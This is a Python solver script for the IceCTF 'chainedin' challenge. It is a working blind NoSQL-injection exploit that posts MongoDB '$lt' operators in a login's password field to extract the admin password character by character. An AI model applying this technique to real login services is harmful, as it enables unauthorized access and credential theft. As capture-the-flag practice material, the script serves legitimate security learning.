import requests
import json
import sys

passw = "IceCTF{" #Starting known with a known format

# Need to set up headers. Particularly the Content-Type is important here.
headers = {'Cookie':'__cfduid=db05a6bd30440496d32596af1e98e62631470962497; _ga=GA1.2.6846
    01302.1470962506','Connection':'keep-alive','Referer':'http://chainedin.vuln.icec.tf/logi
    n','Content-Type':'application/json;charset=utf-8'} 

# Since it is a password we know it has to be printable.
# Due to the way in which we're injecting string.printable won't work here because it goes [0-9][a-z][A-Z]
# which will cause false positives since the ascii value of lower case characters are higher than upper case characters. 
# Meaning if the password was IceCTF{I} we would have received a "positive" on IceCTF{a}, IceCTF{b}, etc
 
charlist="!.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz" #Printable in order '}' would break the json so I left that out. I did minimal punctuation, but could have added it if the flag wasn't found.
while True: 
     for i in range(0,len(charlist)):
            payload = json.dumps({u"user":u"admin",u"pass":{u"$lt":str(passw+charlist[i]) # Needed to be sending JSON data.
    }})
            r = requests.post('http://chainedin.vuln.icec.tf/login',data=payload,headers=headers) # Build the request and post it.
            if "Administrator" in r.text: # success condition
                passw=passw+charlist[i-1] # The character to cause a "positive" in this case is one too far. i.e. if 'J' is a postive then 'I' is the correct character.
                print(passw)
                break
            elif i >= len(charlist)-1:
                print("Your flag is: " + passw + "}")
                sys.exit(0)